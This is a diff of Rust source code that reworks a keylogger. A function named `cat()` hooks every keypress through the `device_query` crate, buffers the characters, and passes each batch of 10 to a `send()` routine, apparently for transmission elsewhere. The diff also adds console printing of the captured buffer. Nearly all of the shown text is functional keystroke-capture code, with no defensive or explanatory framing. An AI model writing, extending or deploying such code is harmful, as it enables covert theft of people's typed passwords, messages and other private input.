@@ -1,6 +1,6 @@
 use std::sync::{Arc, Mutex};
 use std::thread;
-use device_query::DeviceEvents;
+use device_query::{DeviceEvents, device_state};
 use device_query::Keycode;
 pub use device_query::device_events::KeyboardCallback;
 use device_query::{DeviceState, keymap};
@@ -14,6 +14,15 @@ use crate::sys::get_date;
 
 pub fn cat(){
     let device_state = DeviceState::new();
+    let _device_state = listen2(device_state);
+
+    loop {
+
+    }
+
+}
+
+fn listen2(device_state: DeviceState) -> CallbackGuard<impl Fn(&Keycode)>{
     let mut cache = Arc::new(Mutex::new(String::new())); 
     let cache_clone = Arc::clone(&cache);
 
@@ -23,17 +32,15 @@ pub fn cat(){
         let chars = keycode_to_string(*keys); 
         let mut cache = cache_clone.lock().unwrap();
         cache.push_str(chars);
+
+        println!("{}", cache);
         if cache.len() >= 10 {
             send(cache.clone()); 
             println!("{}", cache);
             cache.clear();
             }
         }
-    );
-    loop {
-
-    }
-
+    )
 }
 
 fn listen(device_state:DeviceState) -> CallbackGuard<impl Fn(&Keycode)>{
